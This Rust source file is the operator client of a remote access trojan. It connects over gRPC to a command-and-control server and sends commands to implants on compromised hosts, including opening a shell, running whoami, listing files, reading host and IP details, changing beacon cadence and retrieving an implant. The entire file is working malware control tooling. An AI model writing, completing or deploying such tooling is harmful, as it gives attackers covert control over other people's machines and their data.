use remote_access_trojan::RsOperatorCommand;
use remote_access_trojan::rat::{OperatorCommand, OperatorRequest};
use remote_access_trojan::rat::schedule_command_client::ScheduleCommandClient;
use std::io::{stdin, stdout, Write};
use tonic::transport::Endpoint;

/*
TODO
    - send commands from operator to server
    - encrypt traffic from operator to server
*/

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("operator");
    // Set up connection to server
    let location = rco_config::RAT_SERVER_LOCATION;
    let port = rco_config::RAT_SERVER_PORT;
    let socket = format!("http://{location}:{port}");
    let channel = Endpoint::from_shared(socket.clone())?
                    .connect()
                    .await?;
    // Prepare a client for beaconing
    let mut schedule_client = ScheduleCommandClient::new(channel.clone());
    loop {
        print!("Command > ");
        stdout().flush().unwrap();
        let mut line = String::new();
        stdin().read_line(&mut line).unwrap();
        let split_line: Vec<&str> = line.split(' ').collect();
        let (command, arguments) = match split_line.len() {
            0 => continue,
            1 => (RsOperatorCommand::from(split_line[0].trim()).into(), "".to_string()),
            _ => (RsOperatorCommand::from(split_line[0].trim()).into(), split_line[1].trim().to_string()),
        };
        match command {
            OperatorCommand::OpNone => continue,
            OperatorCommand::OpQuit => break,
            OperatorCommand::OpHelp => {
                println!("Valid commands:");
                println!("\tcadence <number in seconds>");
                println!("\tdir");
                println!("\thostname");
                println!("\thelp");
                println!("\timplants");
                println!("\tip");
                println!("\tls");
                println!("\tos");
                println!("\tquit");
                println!("\tretrieve <implant id>");
                println!("\tshell");
                println!("\twhoami");
                continue
            },
            _ => ()
        }
        let request= tonic::Request::new(
            OperatorRequest {
                command: OperatorCommand::try_into(command).unwrap(),
                arguments
            },
        );
        let _response = schedule_client.send(request).await?.into_inner();
    }

    Ok(())
}